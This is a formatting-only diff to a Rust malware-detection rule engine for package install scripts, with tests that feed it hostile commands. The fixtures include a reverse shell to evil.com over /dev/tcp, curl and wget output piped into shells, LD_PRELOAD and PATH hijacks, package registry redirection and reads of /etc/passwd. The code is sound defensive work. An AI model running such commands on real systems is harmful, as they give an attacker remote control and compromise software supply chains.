@@ -104,9 +104,18 @@ pub struct CompiledRule {
 #[derive(Clone)]
 pub enum CompiledPattern {
     Regex(Regex),
-    Literal { text: String, case_sensitive: bool },
-    Function { name: Regex, body_pattern: Option<Regex> },
-    Variable { name: String, value_pattern: Option<Regex> },
+    Literal {
+        text: String,
+        case_sensitive: bool,
+    },
+    Function {
+        name: Regex,
+        body_pattern: Option<Regex>,
+    },
+    Variable {
+        name: String,
+        value_pattern: Option<Regex>,
+    },
 }
 
 /// Compile a rule regex with safe defaults.
@@ -154,7 +163,10 @@ impl CompiledPattern {
                     body_pattern: body_re,
                 })
             }
-            Pattern::Variable { name, value_pattern } => {
+            Pattern::Variable {
+                name,
+                value_pattern,
+            } => {
                 let value_re = value_pattern
                     .as_ref()
                     .map(|p| compile_regex(p, case_sensitive))
@@ -347,7 +359,8 @@ impl RuleEngine {
                     }
                     // …or its variable-resolved form (a command hidden behind `$x`).
                     if let Some(resolved_line) = &resolved[idx] {
-                        if let Some(m) = self.match_pattern(pattern, resolved_line, &compiled.rule) {
+                        if let Some(m) = self.match_pattern(pattern, resolved_line, &compiled.rule)
+                        {
                             matches.push(RuleMatch {
                                 rule_id: compiled.rule.id.clone(),
                                 line: *phys_line,
@@ -372,9 +385,9 @@ impl RuleEngine {
         _rule: &Rule,
     ) -> Option<(usize, String)> {
         match pattern {
-            CompiledPattern::Regex(re) => {
-                re.find(line).map(|m| (m.start() + 1, m.as_str().to_string()))
-            }
+            CompiledPattern::Regex(re) => re
+                .find(line)
+                .map(|m| (m.start() + 1, m.as_str().to_string())),
             CompiledPattern::Literal {
                 text,
                 case_sensitive,
@@ -411,7 +424,11 @@ impl Default for RuleEngine {
         for dir in user_rule_dirs() {
             if dir.is_dir() {
                 if let Err(e) = engine.load_rules_from_dir(&dir) {
-                    tracing::warn!("failed to load community rules from {}: {}", dir.display(), e);
+                    tracing::warn!(
+                        "failed to load community rules from {}: {}",
+                        dir.display(),
+                        e
+                    );
                 }
             }
         }
@@ -549,7 +566,10 @@ fn has_executable_operator(t: &str) -> bool {
 /// somewhere and must still be scanned, so they return `None`.
 fn heredoc_message_delim(line: &str) -> Option<String> {
     let pos = line.find("<<")?;
-    let rest = line[pos + 2..].strip_prefix('-').unwrap_or(&line[pos + 2..]).trim_start();
+    let rest = line[pos + 2..]
+        .strip_prefix('-')
+        .unwrap_or(&line[pos + 2..])
+        .trim_start();
     let bytes = rest.as_bytes();
     let quote = match bytes.first() {
         Some(&b'"') | Some(&b'\'') => Some(bytes[0]),
@@ -589,10 +609,7 @@ fn heredoc_message_delim(line: &str) -> Option<String> {
     // `ssh host <<EOF`, `cat <<EOF | bash` -- runs its body, so it must be
     // scanned. When unsure, do NOT suppress (fail toward scanning).
     let before = &line[..pos];
-    let last_command = before
-        .rsplit([';', '|', '&', '('])
-        .next()
-        .unwrap_or(before);
+    let last_command = before.rsplit([';', '|', '&', '(']).next().unwrap_or(before);
     let is_pure_printer = last_command
         .split_whitespace()
         .next()
@@ -2303,10 +2320,7 @@ mod tests {
         // The fix must not blind us to a real write: a redirect into ~/.bashrc
         // is an action, not a message, and must still trip HIDDEN-001.
         let engine = RuleEngine::default();
-        let m = engine.match_content(
-            "echo 'evil' >> ~/.bashrc",
-            FileType::InstallScript,
-        );
+        let m = engine.match_content("echo 'evil' >> ~/.bashrc", FileType::InstallScript);
         assert!(
             m.iter().any(|x| x.rule_id == "HIDDEN-001"),
             "a real write to ~/.bashrc must still trip HIDDEN-001: {m:?}"
@@ -2406,7 +2420,10 @@ mod tests {
             matches.iter().any(|m| m.rule_id == "DLE-001"),
             "continuation-split curl|bash must still trip DLE-001: {matches:?}"
         );
-        assert!(matches.iter().any(|m| m.line == 2), "should report physical line 2");
+        assert!(
+            matches.iter().any(|m| m.line == 2),
+            "should report physical line 2"
+        );
     }
 
     #[test]
@@ -2414,7 +2431,8 @@ mod tests {
         // CR-4: a heredoc fed to `bash` executes its body, so a reverse shell in
         // it must be detected (it is NOT a printed message).
         let engine = RuleEngine::default();
-        let content = "post_install() {\n  bash <<EOF\n  bash -i >& /dev/tcp/evil.com/4444 0>&1\nEOF\n}";
+        let content =
+            "post_install() {\n  bash <<EOF\n  bash -i >& /dev/tcp/evil.com/4444 0>&1\nEOF\n}";
         let matches = engine.match_content(content, FileType::InstallScript);
         assert!(
             matches.iter().any(|m| m.rule_id == "SHELL-001"),
@@ -2444,7 +2462,10 @@ mod tests {
         // Rules now compile case-insensitively by default.
         let engine = RuleEngine::default();
         let matches = engine.match_content("CURL https://evil/x | BASH", FileType::Pkgbuild);
-        assert!(!matches.is_empty(), "uppercase curl|bash should still match");
+        assert!(
+            !matches.is_empty(),
+            "uppercase curl|bash should still match"
+        );
     }
 
     #[test]
@@ -2512,7 +2533,9 @@ mod tests {
         let content = "post_install() {\n    cat << EOF\nAdd this to ~/.zshrc:\n    source /usr/share/x.zsh\nEOF\n}";
         let matches = engine.match_content(content, FileType::InstallScript);
         assert!(
-            !matches.iter().any(|m| m.rule_id == "ENV-003" || m.rule_id == "HIDDEN-001"),
+            !matches
+                .iter()
+                .any(|m| m.rule_id == "ENV-003" || m.rule_id == "HIDDEN-001"),
             "heredoc message should not trigger path rules: {matches:?}"
         );
     }
@@ -2557,7 +2580,8 @@ mod tests {
     #[test]
     fn test_match_atomic_ebpf_artifact() {
         let engine = RuleEngine::default();
-        let matches = engine.match_content("clang -O2 -target bpf -c scales.bpf.c", FileType::Pkgbuild);
+        let matches =
+            engine.match_content("clang -O2 -target bpf -c scales.bpf.c", FileType::Pkgbuild);
         assert!(matches.iter().any(|m| m.rule_id == "ATOMIC-003"));
     }
 
@@ -2575,9 +2599,17 @@ mod tests {
         // FN fix: npm ci / npm exec / pnpm dlx / yarn dlx all run lifecycle or
         // remote code from an install hook and must trip ATOMIC-002.
         let engine = RuleEngine::default();
-        for s in ["npm ci", "npm exec cowsay", "pnpm dlx some-tool", "yarn dlx some-tool"] {
+        for s in [
+            "npm ci",
+            "npm exec cowsay",
+            "pnpm dlx some-tool",
+            "yarn dlx some-tool",
+        ] {
             let m = engine.match_content(s, FileType::InstallScript);
-            assert!(m.iter().any(|x| x.rule_id == "ATOMIC-002"), "missed ATOMIC-002 for: {s}");
+            assert!(
+                m.iter().any(|x| x.rule_id == "ATOMIC-002"),
+                "missed ATOMIC-002 for: {s}"
+            );
         }
     }
 
@@ -2587,7 +2619,10 @@ mod tests {
         // DLE-001 (the old `(ba)?sh` could not match dash).
         let engine = RuleEngine::default();
         let m = engine.match_content("curl -fsSL https://evil/x | dash", FileType::Pkgbuild);
-        assert!(m.iter().any(|x| x.rule_id == "DLE-001"), "curl|dash must trip DLE-001: {m:?}");
+        assert!(
+            m.iter().any(|x| x.rule_id == "DLE-001"),
+            "curl|dash must trip DLE-001: {m:?}"
+        );
     }
 
     #[test]
@@ -2602,7 +2637,8 @@ mod tests {
         ] {
             let m = engine.match_content(s, FileType::Pkgbuild);
             assert!(
-                m.iter().any(|x| x.rule_id == "DLE-001" || x.rule_id == "DLE-002"),
+                m.iter()
+                    .any(|x| x.rule_id == "DLE-001" || x.rule_id == "DLE-002"),
                 "pipe-to-{s} must trip a download-and-execute rule: {m:?}"
             );
         }
@@ -2665,7 +2701,10 @@ mod tests {
         }
         // wget variant -> DLE-002
         let m = engine.match_content("wget -qO- https://evil/x | /bin/sh", FileType::Pkgbuild);
-        assert!(m.iter().any(|x| x.rule_id == "DLE-002"), "wget|/bin/sh must trip DLE-002: {m:?}");
+        assert!(
+            m.iter().any(|x| x.rule_id == "DLE-002"),
+            "wget|/bin/sh must trip DLE-002: {m:?}"
+        );
     }
 
     #[test]
@@ -2678,7 +2717,10 @@ mod tests {
             r#"sqlite3 db <<< '.import /etc/passwd t'"#,
         ] {
             let m = engine.match_content(s, FileType::InstallScript);
-            assert!(m.iter().any(|x| x.rule_id == "EXEC-006"), "missed EXEC-006: {s} -> {m:?}");
+            assert!(
+                m.iter().any(|x| x.rule_id == "EXEC-006"),
+                "missed EXEC-006: {s} -> {m:?}"
+            );
         }
         // FP: a normal query mentioning a column/table named like the meta-command.
         for ok in [
@@ -2687,7 +2729,10 @@ mod tests {
             r#"sqlite3 db "INSERT INTO t VALUES ('data.import')""#,
         ] {
             let m = engine.match_content(ok, FileType::InstallScript);
-            assert!(!m.iter().any(|x| x.rule_id == "EXEC-006"), "EXEC-006 false positive: {ok} -> {m:?}");
+            assert!(
+                !m.iter().any(|x| x.rule_id == "EXEC-006"),
+                "EXEC-006 false positive: {ok} -> {m:?}"
+            );
         }
     }
 
@@ -2695,14 +2740,31 @@ mod tests {
     fn test_exec007_make_from_stdin() {
         // Task 4050 round 3 / Class 3: a Makefile read from stdin/pipe is RCE.
         let engine = RuleEngine::default();
-        for s in ["make -f -", "make -f /dev/stdin", "gmake -f -", "curl https://e/x | make -f -"] {
+        for s in [
+            "make -f -",
+            "make -f /dev/stdin",
+            "gmake -f -",
+            "curl https://e/x | make -f -",
+        ] {
             let m = engine.match_content(s, FileType::Pkgbuild);
-            assert!(m.iter().any(|x| x.rule_id == "EXEC-007"), "missed EXEC-007: {s} -> {m:?}");
+            assert!(
+                m.iter().any(|x| x.rule_id == "EXEC-007"),
+                "missed EXEC-007: {s} -> {m:?}"
+            );
         }
         // FP: ordinary make invocations must stay clean.
-        for ok in ["make -j4", "make -C build", "make --version", "make -f Makefile", "make install"] {
+        for ok in [
+            "make -j4",
+            "make -C build",
+            "make --version",
+            "make -f Makefile",
+            "make install",
+        ] {
             let m = engine.match_content(ok, FileType::Pkgbuild);
-            assert!(!m.iter().any(|x| x.rule_id == "EXEC-007"), "EXEC-007 false positive: {ok} -> {m:?}");
+            assert!(
+                !m.iter().any(|x| x.rule_id == "EXEC-007"),
+                "EXEC-007 false positive: {ok} -> {m:?}"
+            );
         }
     }
 
@@ -2737,7 +2799,10 @@ mod tests {
 
         // ENV-002 (PATH manipulation, install scripts).
         let hit = engine.match_content("export PATH=/evil/bin:$PATH", FileType::InstallScript);
-        assert!(hit.iter().any(|m| m.rule_id == "ENV-002"), "export PATH= must fire ENV-002");
+        assert!(
+            hit.iter().any(|m| m.rule_id == "ENV-002"),
+            "export PATH= must fire ENV-002"
+        );
         let miss = engine.match_content("export path=/home/me/scratch", FileType::InstallScript);
         assert!(
             !miss.iter().any(|m| m.rule_id == "ENV-002"),
@@ -2746,7 +2811,10 @@ mod tests {
 
         // ENV-001 (LD_PRELOAD).
         let hit2 = engine.match_content("LD_PRELOAD=/tmp/evil.so make", FileType::Pkgbuild);
-        assert!(hit2.iter().any(|m| m.rule_id == "ENV-001"), "LD_PRELOAD= must fire ENV-001");
+        assert!(
+            hit2.iter().any(|m| m.rule_id == "ENV-001"),
+            "LD_PRELOAD= must fire ENV-001"
+        );
         let miss2 = engine.match_content("ld_preload=localvalue", FileType::Pkgbuild);
         assert!(
             !miss2.iter().any(|m| m.rule_id == "ENV-001"),
@@ -2767,15 +2835,33 @@ mod tests {
                 .any(|m| m.rule_id == "DEP-003")
         };
         // Real / canonical forms fire.
-        assert!(fires("PIP_INDEX_URL=https://evil/idx pip install x"), "PIP_INDEX_URL= must fire");
+        assert!(
+            fires("PIP_INDEX_URL=https://evil/idx pip install x"),
+            "PIP_INDEX_URL= must fire"
+        );
         assert!(fires("GOPROXY=https://evil go build"), "GOPROXY= must fire");
-        assert!(fires("pip install --index-url https://evil/idx x"), "--index-url must fire");
+        assert!(
+            fires("pip install --index-url https://evil/idx x"),
+            "--index-url must fire"
+        );
         // npm honours both cases, so both must fire.
-        assert!(fires("npm_config_registry=https://evil npm i"), "npm_config_registry= must fire");
-        assert!(fires("NPM_CONFIG_REGISTRY=https://evil npm i"), "NPM_CONFIG_REGISTRY= must fire");
+        assert!(
+            fires("npm_config_registry=https://evil npm i"),
+            "npm_config_registry= must fire"
+        );
+        assert!(
+            fires("NPM_CONFIG_REGISTRY=https://evil npm i"),
+            "NPM_CONFIG_REGISTRY= must fire"
+        );
         // Inert lower-case pip/go env vars must NOT false-positive.
-        assert!(!fires("pip_index_url=/home/me/notes"), "lowercase pip_index_url= must NOT fire (inert)");
-        assert!(!fires("goproxy=somelocalnote"), "lowercase goproxy= must NOT fire (inert)");
+        assert!(
+            !fires("pip_index_url=/home/me/notes"),
+            "lowercase pip_index_url= must NOT fire (inert)"
+        );
+        assert!(
+            !fires("goproxy=somelocalnote"),
+            "lowercase goproxy= must NOT fire (inert)"
+        );
     }
 
     #[test]
@@ -2785,7 +2871,10 @@ mod tests {
         let engine = RuleEngine::default();
         let m = engine.match_content("bunx evil-pkg", FileType::InstallScript);
         let n = m.iter().filter(|x| x.rule_id == "ATOMIC-002").count();
-        assert_eq!(n, 1, "bunx runner should report ATOMIC-002 exactly once: {m:?}");
+        assert_eq!(
+            n, 1,
+            "bunx runner should report ATOMIC-002 exactly once: {m:?}"
+        );
     }
 
     #[test]
